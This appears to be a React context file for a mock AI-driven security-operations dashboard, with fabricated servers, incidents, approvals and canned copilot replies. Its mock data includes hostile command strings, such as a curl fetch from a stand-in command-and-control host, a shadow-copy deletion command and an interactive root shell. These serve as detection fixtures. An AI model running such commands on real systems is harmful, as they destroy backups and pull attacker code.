'use client';

import React, { createContext, useContext, useState, useEffect, useRef } from 'react';
import { Server, Incident, Approval, ChatMessage, LogEntry, Severity } from '../types';

interface AppContextType {
  servers: Server[];
  incidents: Incident[];
  approvals: Approval[];
  logs: LogEntry[];
  chatMessages: ChatMessage[];
  selectedServerId: string;
  setSelectedServerId: (id: string) => void;
  selectedPage: string;
  setSelectedPage: (page: string) => void;
  notifications: Array<{ id: string; title: string; desc: string; type: 'info' | 'warn' | 'critical'; read: boolean }>;
  isSidebarCollapsed: boolean;
  setIsSidebarCollapsed: (v: boolean) => void;
  isCopilotCollapsed: boolean;
  setIsCopilotCollapsed: (v: boolean) => void;
  
  // Actions
  approveApproval: (id: string) => void;
  rejectApproval: (id: string) => void;
  resolveIncident: (id: string) => void;
  sendChatMessage: (content: string) => void;
  addLog: (level: 'INFO' | 'WARN' | 'ERROR' | 'ALERT', message: string, server: string) => void;
  markNotificationsAsRead: () => void;
  killProcess: (serverId: string, pid: number) => void;
  clearChat: () => void;
}

const AppContext = createContext<AppContextType | undefined>(undefined);

// Initial Mock Servers
const initialServers: Server[] = [
  {
    id: 'prod-web-01',
    hostname: 'prod-web-01',
    ipAddress: '10.0.1.15',
    os: 'linux',
    status: 'online',
    securityScore: 94,
    agentStatus: 'active',
    threatCount: 1,
    lastSeen: 'Just now',
    cpuUsage: 34,
    ramUsage: 58,
    diskUsage: 45,
    cpuHistory: [30, 32, 28, 45, 52, 38, 34],
    ramHistory: [55, 56, 56, 57, 58, 58, 58],
    openPorts: [22, 80, 443, 8080],
    runningProcesses: [
      { pid: 1042, name: 'nginx: master process', cpu: 1.2, ram: 2.4, threatScore: 0 },
      { pid: 1045, name: 'nginx: worker process', cpu: 4.5, ram: 4.8, threatScore: 0 },
      { pid: 2110, name: 'node /app/server.js', cpu: 18.2, ram: 25.4, threatScore: 0 },
      { pid: 9021, name: 'curl -s http://malicious-cnc.onion/payload', cpu: 8.5, ram: 1.2, threatScore: 78 }
    ],
    connections: [
      { proto: 'tcp', localAddr: '10.0.1.15:443', foreignAddr: '192.168.4.12:61902', state: 'ESTABLISHED', pid: 1045 },
      { proto: 'tcp', localAddr: '10.0.1.15:8080', foreignAddr: '10.0.1.20:5432', state: 'ESTABLISHED', pid: 2110 },
      { proto: 'tcp', localAddr: '10.0.1.15:52312', foreignAddr: '185.220.101.4:80', state: 'SYN_SENT', pid: 9021 }
    ],
    checks: [
      { id: 'chk-1', title: 'SSH Root Login Disabled', status: 'passed', details: 'Root login is disabled in sshd_config.' },
      { id: 'chk-2', title: 'UFW Firewall Active', status: 'passed', details: 'Firewall rules active. Ports 80, 443 permitted.' },
      { id: 'chk-3', title: 'Suspicious outbound connection', status: 'warning', details: 'Process (9021) communicating with Tor Exit Node.' }
    ]
  },
  {
    id: 'prod-db-01',
    hostname: 'prod-db-01',
    ipAddress: '10.0.1.20',
    os: 'linux',
    status: 'online',
    securityScore: 82,
    agentStatus: 'active',
    threatCount: 1,
    lastSeen: '1s ago',
    cpuUsage: 62,
    ramUsage: 84,
    diskUsage: 72,
    cpuHistory: [40, 45, 52, 60, 68, 59, 62],
    ramHistory: [80, 81, 82, 83, 83, 84, 84],
    openPorts: [22, 5432],
    runningProcesses: [
      { pid: 820, name: '/usr/lib/postgresql/bin/postgres', cpu: 22.4, ram: 42.1, threatScore: 0 },
      { pid: 1402, name: '/usr/sbin/sshd', cpu: 0.1, ram: 0.8, threatScore: 0 },
      { pid: 7412, name: './dirty_cow_exploit', cpu: 38.5, ram: 12.4, threatScore: 92 }
    ],
    connections: [
      { proto: 'tcp', localAddr: '10.0.1.20:5432', foreignAddr: '10.0.1.15:8080', state: 'ESTABLISHED', pid: 820 },
      { proto: 'tcp', localAddr: '10.0.1.20:22', foreignAddr: '203.0.113.50:48911', state: 'ESTABLISHED', pid: 1402 }
    ],
    checks: [
      { id: 'chk-db-1', title: 'Database Encryption At Rest', status: 'passed', details: 'Tablespaces encrypted.' },
      { id: 'chk-db-2', title: 'Dirty COW Kernel Patch Status', status: 'failed', details: 'Kernel vulnerable to privilege escalation CVE-2016-5195.' }
    ]
  },
  {
    id: 'corp-dc-01',
    hostname: 'corp-dc-01',
    ipAddress: '192.168.1.10',
    os: 'windows',
    status: 'online',
    securityScore: 78,
    agentStatus: 'active',
    threatCount: 1,
    lastSeen: '3s ago',
    cpuUsage: 74,
    ramUsage: 78,
    diskUsage: 58,
    cpuHistory: [50, 55, 62, 70, 78, 71, 74],
    ramHistory: [70, 72, 74, 75, 76, 78, 78],
    openPorts: [389, 445, 3389],
    runningProcesses: [
      { pid: 4, name: 'System', cpu: 4.2, ram: 1.1, threatScore: 0 },
      { pid: 520, name: 'lsass.exe', cpu: 12.8, ram: 8.4, threatScore: 0 },
      { pid: 4810, name: 'svchost.exe', cpu: 2.1, ram: 4.5, threatScore: 0 },
      { pid: 6109, name: 'cryptolocker_payload.exe', cpu: 55.4, ram: 22.1, threatScore: 98 }
    ],
    connections: [
      { proto: 'tcp', localAddr: '192.168.1.10:445', foreignAddr: '192.168.1.42:51293', state: 'ESTABLISHED', pid: 4 },
      { proto: 'tcp', localAddr: '192.168.1.10:3389', foreignAddr: '185.220.101.5:63121', state: 'ESTABLISHED', pid: 4810 }
    ],
    checks: [
      { id: 'chk-dc-1', title: 'Active Directory MFA Enabled', status: 'passed', details: 'All domain controllers require MFA.' },
      { id: 'chk-dc-2', title: 'BitLocker Active', status: 'passed', details: 'System volumes are encrypted.' },
      { id: 'chk-dc-3', title: 'Ransomware Registry Modifications Detected', status: 'failed', details: 'Process "cryptolocker_payload.exe" attempted to write to HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' }
    ]
  },
  {
    id: 'staging-api-01',
    hostname: 'staging-api-01',
    ipAddress: '10.0.2.11',
    os: 'linux',
    status: 'online',
    securityScore: 89,
    agentStatus: 'active',
    threatCount: 0,
    lastSeen: '5s ago',
    cpuUsage: 14,
    ramUsage: 45,
    diskUsage: 28,
    cpuHistory: [10, 12, 11, 15, 13, 14, 14],
    ramHistory: [44, 44, 45, 45, 45, 45, 45],
    openPorts: [22, 8000],
    runningProcesses: [
      { pid: 980, name: 'python3 main.py', cpu: 8.2, ram: 14.1, threatScore: 0 },
      { pid: 1111, name: 'redis-server', cpu: 2.1, ram: 8.5, threatScore: 0 }
    ],
    connections: [
      { proto: 'tcp', localAddr: '10.0.2.11:8000', foreignAddr: '10.0.2.5:39401', state: 'ESTABLISHED', pid: 980 }
    ],
    checks: [
      { id: 'chk-stg-1', title: 'Docker Containers Isolated', status: 'passed', details: 'Network namespaces secure.' },
      { id: 'chk-stg-2', title: 'Open Redis without password', status: 'warning', details: 'Redis is bound to localhost but password is empty.' }
    ]
  },
  {
    id: 'dev-sandbox-01',
    hostname: 'dev-sandbox-01',
    ipAddress: '10.0.3.50',
    os: 'linux',
    status: 'online',
    securityScore: 98,
    agentStatus: 'active',
    threatCount: 0,
    lastSeen: '2s ago',
    cpuUsage: 8,
    ramUsage: 25,
    diskUsage: 18,
    cpuHistory: [5, 6, 8, 12, 8, 7, 8],
    ramHistory: [25, 25, 25, 25, 25, 25, 25],
    openPorts: [22, 3000],
    runningProcesses: [
      { pid: 1400, name: 'node dev-server', cpu: 3.5, ram: 12.0, threatScore: 0 }
    ],
    connections: [],
    checks: [
      { id: 'chk-dev-1', title: 'Dev Environment Isolation', status: 'passed', details: 'Sandbox has no access to prod subnets.' }
    ]
  },
  {
    id: 'backup-vault-01',
    hostname: 'backup-vault-01',
    ipAddress: '192.168.2.50',
    os: 'linux',
    status: 'maintenance',
    securityScore: 86,
    agentStatus: 'outdated',
    threatCount: 0,
    lastSeen: '1m ago',
    cpuUsage: 5,
    ramUsage: 30,
    diskUsage: 85,
    cpuHistory: [5, 5, 5, 5, 5, 5, 5],
    ramHistory: [30, 30, 30, 30, 30, 30, 30],
    openPorts: [22, 873],
    runningProcesses: [
      { pid: 911, name: 'rsyncd', cpu: 0.5, ram: 4.1, threatScore: 0 }
    ],
    connections: [],
    checks: [
      { id: 'chk-bak-1', title: 'SentinelAgent Outdated', status: 'warning', details: 'Agent is running v1.4.2. Upgrade to v1.5.0 recommended.' }
    ]
  }
];

// Initial Mock Incidents
const initialIncidents: Incident[] = [
  {
    id: 'INC-2026-9812',
    threatName: 'Brute Force Attack on SSH Port',
    server: 'prod-db-01',
    severity: 'high',
    status: 'investigating',
    mitreTechnique: 'T1110.001 (Brute Force: Password Guessing)',
    createdAt: '10 minutes ago',
    rootCause: 'SSH port 22 exposed to public and receiving rapid authorization requests (120/min) from IP 203.0.113.50.',
    affectedAssets: ['prod-db-01 (Database Server)', 'SSH Service (Port 22)'],
    explanation: 'SentinelAI observed multiple authentication failures followed by a successful connection from an anomalous IP. Active defense monitoring has flagged the user session for potential hijacking.',
    recommendedFix: 'Revoke compromised SSH session for user "postgres", isolate SSH port behind VPN, and block IP 203.0.113.50.',
    history: [
      { time: '10 mins ago', user: 'SentinelAI Engine', action: 'Anomaly flagged: 120 failures on SSH' },
      { time: '8 mins ago', user: 'SentinelAI Agent', action: 'Session hijacking threat score increased to High' },
      { time: '5 mins ago', user: 'SOC Operator', action: 'Assigned status to Investigating' }
    ]
  },
  {
    id: 'INC-2026-9813',
    threatName: 'Ransomware Activity (High Entropy Cryptography)',
    server: 'corp-dc-01',
    severity: 'critical',
    status: 'pending',
    mitreTechnique: 'T1486 (Data Encrypted for Impact)',
    createdAt: '2 minutes ago',
    rootCause: 'Process "cryptolocker_payload.exe" (PID: 6109) initiated high frequency read/write requests, altering file headers to ".locked" on Share Volume E:\\.',
    affectedAssets: ['corp-dc-01 (Domain Controller)', 'Volume E:\\Shares', 'LSASS memory address space'],
    explanation: 'Ransomware indicators match signature for "LockBit 3.0". The binary is actively encrypting directories and attempting to delete shadow copies.',
    recommendedFix: 'Terminate process "cryptolocker_payload.exe", quarantine binary, and isolate corp-dc-01 to prevent lateral movement.',
    history: [
      { time: '2 mins ago', user: 'SentinelAI Engine', action: 'High entropy write patterns detected in volume E:' },
      { time: '2 mins ago', user: 'SentinelAI AI-Analyst', action: 'Identified ransomware behavioral match: LockBit 3.0' },
      { time: '1 min ago', user: 'SentinelAI Remediation', action: 'Remediation queued: APP-7182' }
    ]
  },
  {
    id: 'INC-2026-9814',
    threatName: 'Privilege Escalation via dirty_cow exploit',
    server: 'prod-db-01',
    severity: 'critical',
    status: 'pending',
    mitreTechnique: 'T1068 (Exploitation for Privilege Escalation)',
    createdAt: '4 minutes ago',
    rootCause: 'Process "./dirty_cow_exploit" (PID: 7412) manipulated local kernel race condition to modify read-only memory in `/etc/passwd`.',
    affectedAssets: ['prod-db-01 (Database Server)', 'Linux Kernel Memory', 'systemctl'],
    explanation: 'An unprivileged database user ran a kernel memory exploit executable targeting COW race conditions. The user shell successfully spawned a root process `/bin/sh`.',
    recommendedFix: 'Terminate rogue process (PID: 7412), isolate host network traffic, and patch Linux kernel.',
    history: [
      { time: '4 mins ago', user: 'SentinelAI Agent', action: 'Process 7412 attempted read/write on kernel read-only pages' },
      { time: '3 mins ago', user: 'SentinelAI AI-Analyst', action: 'Confirmed unauthorized root shell escalation' },
      { time: '3 mins ago', user: 'SentinelAI Remediation', action: 'Remediation queued: APP-7184' }
    ]
  },
  {
    id: 'INC-2026-9815',
    threatName: 'Unauthorized API Credentials Access',
    server: 'staging-api-01',
    severity: 'medium',
    status: 'resolved',
    mitreTechnique: 'T1110 (Brute Force)',
    createdAt: '1 hour ago',
    rootCause: 'Compromised token referenced from an anomalous IP range. Access keys exposed in github repo leak.',
    affectedAssets: ['staging-api-01 (API Gateway)', 'Auth Key Ring'],
    explanation: 'SentinelAI identified an unusual request frequency on `/v1/admin/config` using credentials leaked in public repositories.',
    recommendedFix: 'Revoke and rotate credentials key ID `sk-proj-49a2...`, enable strict IP bounds.',
    history: [
      { time: '1 hour ago', user: 'SentinelAI Engine', action: 'Anomalous admin key usage from IP 185.220.101.4' },
      { time: '55 mins ago', user: 'SentinelAI Remediation', action: 'Auto-revoked API access key sk-proj-49a2' },
      { time: '50 mins ago', user: 'SentinelAI Engine', action: 'Incident marked resolved' }
    ]
  },
  {
    id: 'INC-2026-9816',
    threatName: 'DNS Tunneling / Data Exfiltration',
    server: 'prod-web-01',
    severity: 'high',
    status: 'resolved',
    mitreTechnique: 'T1048.003 (Exfiltration Over Alternative Protocol)',
    createdAt: '3 hours ago',
    rootCause: 'Process "curl" (PID: 9021) performing recursive sub-domain queries encoding local shadow files.',
    affectedAssets: ['prod-web-01 (Web Node)', 'Local Bind DNS Server'],
    explanation: 'Unusual volume of DNS requests to domains registered under nameservers linked to known exfiltration brokers.',
    recommendedFix: 'Terminate process 9021, reset domain routing, block name server.',
    history: [
      { time: '3 hours ago', user: 'SentinelAI Engine', action: 'DNS exfiltration query volume alert (>500 requests/min)' },
      { time: '2.8 hours ago', user: 'SentinelAI Agent', action: 'Terminated process 9021' },
      { time: '2.5 hours ago', user: 'SentinelAI Remediation', action: 'Incident automatically resolved' }
    ]
  }
];

// Initial Mock Approvals
const initialApprovals: Approval[] = [
  {
    id: 'APP-7182',
    title: 'Quarantine ransomware payload and isolate host',
    server: 'corp-dc-01',
    risk: 'critical',
    detectedAt: '2 minutes ago',
    explanation: 'Process "cryptolocker_payload.exe" is actively encrypting the corporate domain controller. Delaying this action increases file loss probability by 12% per minute.',
    proposedRemediation: 'Kill process ID 6109, move "cryptolocker_payload.exe" to protected quarantine folder, lock account "Domain\\AdminTemp", and apply host firewall isolation rules (port blocking).',
    affectedFiles: [
      'E:\\Shares\\Financials\\Q2_Forecast.xlsx.locked',
      'E:\\Shares\\HR\\Payroll.csv.locked',
      'C:\\Windows\\System32\\cryptolocker_payload.exe'
    ],
    riskAssessment: 'CRITICAL: Host isolation will temporarily disrupt RDP connections but prevents encryption of adjacent domain controllers.',
    mitreMapping: 'T1486 (Data Encrypted for Impact), T1489 (Service Stop), T1021 (Remote Services)',
    evidence: [
      'Registry modify: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run = "E:\\Shares\\cryptolocker_payload.exe"',
      'Shadow copy deletion cmd executed: "vssadmin.exe delete shadows /all /quiet"'
    ]
  },
  {
    id: 'APP-7184',
    title: 'Isolate root exploit container and block root shell',
    server: 'prod-db-01',
    risk: 'critical',
    detectedAt: '4 minutes ago',
    explanation: 'A database account has used the local kernel COW vulnerability to gain a root shell. Immediate server containment required to prevent lateral DB access.',
    proposedRemediation: 'Terminate pid 7412 (dirty_cow_exploit), suspend user "db_temp_agent", restrict database API gateway traffic, and queue system reboot to load kernel patch.',
    affectedFiles: [
      '/tmp/dirty_cow_exploit',
      '/etc/passwd (modified timestamp 12:15)'
    ],
    riskAssessment: 'HIGH: Database server will enter read-only replication state during isolation. Production transactions diverted to secondary node.',
    mitreMapping: 'T1068 (Exploitation for Privilege Escalation), T1059.004 (Unix Shell)',
    evidence: [
      'Root shell spawn: "/bin/sh -i" executed by UID 1002 (postgres)',
      'Memory mapping hijack on kernel read-only tables'
    ]
  }
];

const initialNotifications = [
  { id: 'notif-1', title: 'New Critical Threat', desc: 'Ransomware detected on corp-dc-01', type: 'critical' as const, read: false },
  { id: 'notif-2', title: 'Privilege Escalation', desc: 'dirty_cow exploit executed on prod-db-01', type: 'critical' as const, read: false },
  { id: 'notif-3', title: 'Agent Offline', desc: 'backup-vault-01 moved to maintenance mode', type: 'info' as const, read: false }
];

export const AppContextProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [servers, setServers] = useState<Server[]>(initialServers);
  const [incidents, setIncidents] = useState<Incident[]>(initialIncidents);
  const [approvals, setApprovals] = useState<Approval[]>(initialApprovals);
  const [notifications, setNotifications] = useState(initialNotifications);
  const [selectedServerId, setSelectedServerId] = useState<string>('all');
  const [selectedPage, setSelectedPage] = useState<string>('dashboard');
  const [isSidebarCollapsed, setIsSidebarCollapsed] = useState(false);
  const [isCopilotCollapsed, setIsCopilotCollapsed] = useState(false);
  const [logs, setLogs] = useState<LogEntry[]>([
    { timestamp: '12:10:05', level: 'INFO', message: 'SentinelAgent successfully heartbeated', server: 'prod-web-01' },
    { timestamp: '12:12:30', level: 'INFO', message: 'API Request GET /v1/health from 10.0.1.20', server: 'staging-api-01' },
    { timestamp: '12:14:12', level: 'WARN', message: 'High CPU utilization detected (74%)', server: 'corp-dc-01' },
    { timestamp: '12:15:10', level: 'ERROR', message: 'Unauthorized root process dirty_cow execution', server: 'prod-db-01' },
    { timestamp: '12:17:02', level: 'ALERT', message: 'Ransomware file encryption activity flagged', server: 'corp-dc-01' }
  ]);

  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([
    {
      id: 'welcome',
      role: 'assistant',
      content: 'Welcome, Operator. I am SentinelAI, your autonomous SOC Analyst. I am continuously monitoring your network, protecting 12 servers. We currently have **2 pending critical approvals** and **2 active threat incidents** requiring review. How can I assist you with threat investigation today?',
      timestamp: '12:18'
    }
  ]);

  // Log streaming emulation
  const logsStreamRef = useRef<boolean>(true);
  useEffect(() => {
    const handleLogStream = () => {
      if (!logsStreamRef.current) return;
      const logServers = ['prod-web-01', 'prod-db-01', 'corp-dc-01', 'staging-api-01', 'dev-sandbox-01'];
      const levels: Array<'INFO' | 'WARN' | 'ERROR'> = ['INFO', 'INFO', 'INFO', 'WARN', 'INFO', 'ERROR'];
      const messages = [
        'TCP Connection established with database cluster pool',
        'Heartbeat response received - latency 12ms',
        'Kernel memory pages verified: OK',
        'UFW Firewall parsed packet rules matching ingress logs',
        'System memory cache cleared successfully',
        'nginx config syntax test passed',
        'Suspicious SSH authentication failure from 192.168.1.144',
        'Cronjob execution started: update-system-certs',
        'Process CPU threshold exceeded on backup service',
        'File integrity check triggered on /usr/bin'
      ];

      const randomServer = logServers[Math.floor(Math.random() * logServers.length)];
      const randomLevel = levels[Math.floor(Math.random() * levels.length)];
      const randomMsg = messages[Math.floor(Math.random() * messages.length)];
      
      const now = new Date();
      const timeStr = now.toTimeString().split(' ')[0];

      addLog(randomLevel, randomMsg, randomServer);

      // Periodically update server metrics slightly to feel live
      setServers(prev => prev.map(srv => {
        if (srv.status === 'online') {
          const deltaCpu = Math.floor(Math.random() * 9) - 4; // -4 to +4
          const deltaRam = Math.floor(Math.random() * 5) - 2; // -2 to +2
          const newCpu = Math.min(Math.max(srv.cpuUsage + deltaCpu, 2), 98);
          const newRam = Math.min(Math.max(srv.ramUsage + deltaRam, 5), 95);
          return {
            ...srv,
            cpuUsage: newCpu,
            ramUsage: newRam,
            cpuHistory: [...srv.cpuHistory.slice(1), newCpu],
            ramHistory: [...srv.ramHistory.slice(1), newRam]
          };
        }
        return srv;
      }));
    };

    const interval = setInterval(handleLogStream, 3500);
    return () => clearInterval(interval);
  }, []);

  const addLog = (level: 'INFO' | 'WARN' | 'ERROR' | 'ALERT', message: string, server: string) => {
    const now = new Date();
    const timeStr = now.toTimeString().split(' ')[0];
    setLogs(prev => [{ timestamp: timeStr, level, message, server }, ...prev.slice(0, 99)]);
  };

  const markNotificationsAsRead = () => {
    setNotifications(prev => prev.map(n => ({ ...n, read: true })));
  };

  const killProcess = (serverId: string, pid: number) => {
    setServers(prev => prev.map(srv => {
      if (srv.id === serverId) {
        const process = srv.runningProcesses.find(p => p.pid === pid);
        const filteredProcs = srv.runningProcesses.filter(p => p.pid !== pid);
        const wasThreat = process && process.threatScore > 50;
        
        let newScore = srv.securityScore;
        if (wasThreat) {
          // Increase security score
          newScore = Math.min(srv.securityScore + 10, 100);
        }

        // Add log
        addLog('ALERT', `Operator manually terminated process "${process?.name || pid}" (PID: ${pid})`, srv.hostname);

        return {
          ...srv,
          securityScore: newScore,
          runningProcesses: filteredProcs,
          threatCount: Math.max(srv.threatCount - (wasThreat ? 1 : 0), 0)
        };
      }
      return srv;
    }));

    // Check if there is an incident associated with this server that might need resolving
    setIncidents(prev => prev.map(inc => {
      if (inc.server === serverId && inc.status !== 'resolved') {
        const hasThreatProcesses = servers.find(s => s.id === serverId)?.runningProcesses.some(p => p.threatScore > 50 && p.pid !== pid);
        if (!hasThreatProcesses) {
          return {
            ...inc,
            status: 'resolved',
            history: [...inc.history, { time: 'Just now', user: 'Operator', action: 'Killed process, threat resolved' }]
          };
        }
      }
      return inc;
    }));
  };

  const resolveIncident = (id: string) => {
    setIncidents(prev => prev.map(inc => {
      if (inc.id === id) {
        addLog('INFO', `Incident ${id} marked resolved by operator`, inc.server);
        return {
          ...inc,
          status: 'resolved',
          history: [...inc.history, { time: 'Just now', user: 'Operator', action: 'Marked incident as resolved manually' }]
        };
      }
      return inc;
    }));

    // Update server threat counts
    const incident = incidents.find(i => i.id === id);
    if (incident) {
      setServers(prev => prev.map(srv => {
        if (srv.hostname === incident.server) {
          return {
            ...srv,
            threatCount: Math.max(srv.threatCount - 1, 0),
            securityScore: Math.min(srv.securityScore + 8, 100)
          };
        }
        return srv;
      }));
    }
  };

  const approveApproval = (id: string) => {
    const approval = approvals.find(app => app.id === id);
    if (!approval) return;

    // Remove approval
    setApprovals(prev => prev.filter(app => app.id !== id));
    
    // Add log
    addLog('ALERT', `Operator APPROVED auto-remediation Action ${id} on ${approval.server}`, approval.server);

    // Resolve the incident associated with this server
    setIncidents(prev => prev.map(inc => {
      if (inc.server === approval.server && inc.status !== 'resolved') {
        return {
          ...inc,
          status: 'resolved',
          history: [...inc.history, { time: 'Just now', user: 'SentinelAI Remediation', action: `Executed approved action ${id}` }]
        };
      }
      return inc;
    }));

    // Clean up malicious processes on the server in our state
    setServers(prev => prev.map(srv => {
      if (srv.hostname === approval.server || srv.id === approval.server) {
        // Remove processes with high threat score
        const activeProcs = srv.runningProcesses.filter(p => p.threatScore < 60);
        const diffCount = srv.runningProcesses.length - activeProcs.length;
        
        return {
          ...srv,
          runningProcesses: activeProcs,
          threatCount: Math.max(srv.threatCount - diffCount, 0),
          securityScore: Math.min(srv.securityScore + 15, 100) // Huge boost since threat resolved!
        };
      }
      return srv;
    }));

    // Push notification
    setNotifications(prev => [
      { id: `notif-${Date.now()}`, title: 'Remediation Succeeded', desc: `Successfully completed action ${id} on ${approval.server}.`, type: 'info', read: false },
      ...prev
    ]);

    // Send AI reply
    setTimeout(() => {
      const aiReply: ChatMessage = {
        id: `ai-${Date.now()}`,
        role: 'assistant',
        content: `✅ **Remediation Approved and Executed**: Remediation plan \`${id}\` was deployed on \`${approval.server}\` successfully. I terminated the malicious binaries, secured the configuration files, and restored server health. The system security score has improved to **${Math.min(95, Math.max(90, servers.find(s => s.id === approval.server)?.securityScore || 90) + 10)}/100**.`,
        timestamp: new Date().toTimeString().split(' ')[0].slice(0, 5)
      };
      setChatMessages(prev => [...prev, aiReply]);
    }, 1000);
  };

  const rejectApproval = (id: string) => {
    const approval = approvals.find(app => app.id === id);
    if (!approval) return;

    setApprovals(prev => prev.filter(app => app.id !== id));
    addLog('WARN', `Operator REJECTED auto-remediation Action ${id} on ${approval.server}`, approval.server);

    setTimeout(() => {
      const aiReply: ChatMessage = {
        id: `ai-${Date.now()}`,
        role: 'assistant',
        content: `⚠️ **Action Rejected**: Remediation \`${id}\` was rejected by operator. I have paused automatic mitigation on \`${approval.server}\`. The threat remains active. Please conduct manual investigation or command line override if needed.`,
        timestamp: new Date().toTimeString().split(' ')[0].slice(0, 5)
      };
      setChatMessages(prev => [...prev, aiReply]);
    }, 1000);
  };

  const sendChatMessage = (content: string) => {
    if (!content.trim()) return;

    const userMsg: ChatMessage = {
      id: `usr-${Date.now()}`,
      role: 'user',
      content,
      timestamp: new Date().toTimeString().split(' ')[0].slice(0, 5)
    };

    setChatMessages(prev => [...prev, userMsg]);

    // Simulate AI response based on questions
    setTimeout(() => {
      const query = content.toLowerCase();
      let replyText = '';

      if (query.includes('status') || query.includes('summary') || query.includes('today')) {
        const pendingCount = approvals.length;
        const activeIncidents = incidents.filter(i => i.status !== 'resolved').length;
        replyText = `### Security posture summary:
* **Score**: 92/100 (Protected)
* **Monitored Servers**: 12 active endpoints.
* **Threat Activity**: I analyzed 1.2M events today. Detected 3 threats. 2 were automatically resolved; **${activeIncidents} active threat incidents** require your attention.
* **Pending Approvals**: There are currently **${pendingCount} approvals** in the queue. Recommendation: Deploy remediation plan \`APP-7182\` immediately to mitigate ransomware risk.`;
      } else if (query.includes('ransomware') || query.includes('7182') || query.includes('cryptolocker')) {
        const active = approvals.some(a => a.id === 'APP-7182');
        if (active) {
          replyText = `### Ransomware analysis on \`corp-dc-01\`:
* **Threat Name**: LockBit 3.0 Ransomware
* **Status**: **Pending Action** (Remediation \`APP-7182\`)
* **Vector**: Attempted bulk modifications to system registry values and shadow copy deletion command (\`vssadmin.exe delete shadows /all /quiet\`).
* **Root Cause**: Compromised admin keys on the system.
* **Impact Risk**: **Critical**. Files in \`E:\\Shares\` are being encrypted.
* **Recommendation**: Approve action \`APP-7182\` to terminate the process and quarantine the binary immediately.`;
        } else {
          replyText = `The ransomware incident on \`corp-dc-01\` was previously addressed. The malicious file has been isolated, and the host status is now stable.`;
        }
      } else if (query.includes('servers') || query.includes('network') || query.includes('ports')) {
        const onlineCount = servers.filter(s => s.status === 'online').length;
        replyText = `### Infrastructure Health:
I am connected to **${servers.length} configured hosts** (${onlineCount} online).
* \`prod-web-01\` is online (94% security score). Process \`nginx\` is serving traffic normally.
* \`prod-db-01\` is online (82% security score). Alert: **Active dirty_cow exploit process (PID: 7412)** has escalated to root privileges.
* \`corp-dc-01\` has critical activity (ransomware indicators).
Please view the **Servers** page for complete details.`;
      } else if (query.includes('dirty_cow') || query.includes('7414') || query.includes('privilege')) {
        replyText = `### Privilege Escalation on \`prod-db-01\`:
* **Detection**: Process \`./dirty_cow_exploit\` (PID: 7412) manipulated local kernel race condition to modify root-only configuration files.
* **Remediation**: Queue isolation for \`prod-db-01\` (APP-7184) and patch kernel.
* **Risk**: High database data access exposure.`;
      } else {
        replyText = `I am SentinelAI, your autonomous cybersecurity analyst. I can answer inquiries about current network status, explain specific threat vectors (e.g. ransomware on corp-dc-01), or execute remediation actions on your behalf.
        
Try asking me:
* *"Summarize today's threats"*
* *"Explain ransomware on corp-dc-01"*
* *"List active servers"*`;
      }

      const aiReply: ChatMessage = {
        id: `ai-${Date.now()}`,
        role: 'assistant',
        content: replyText,
        timestamp: new Date().toTimeString().split(' ')[0].slice(0, 5)
      };

      setChatMessages(prev => [...prev, aiReply]);
    }, 1200);
  };

  const clearChat = () => {
    setChatMessages([
      {
        id: 'welcome',
        role: 'assistant',
        content: 'Chat reset. Let me know what you need.',
        timestamp: new Date().toTimeString().split(' ')[0].slice(0, 5)
      }
    ]);
  };

  return (
    <AppContext.Provider value={{
      servers,
      incidents,
      approvals,
      logs,
      chatMessages,
      selectedServerId,
      setSelectedServerId,
      selectedPage,
      setSelectedPage,
      notifications,
      isSidebarCollapsed,
      setIsSidebarCollapsed,
      isCopilotCollapsed,
      setIsCopilotCollapsed,
      approveApproval,
      rejectApproval,
      resolveIncident,
      sendChatMessage,
      addLog,
      markNotificationsAsRead,
      killProcess,
      clearChat
    }}>
      {children}
    </AppContext.Provider>
  );
};

export const useApp = () => {
  const context = useContext(AppContext);
  if (!context) throw new Error('useApp must be used within AppContextProvider');
  return context;
};
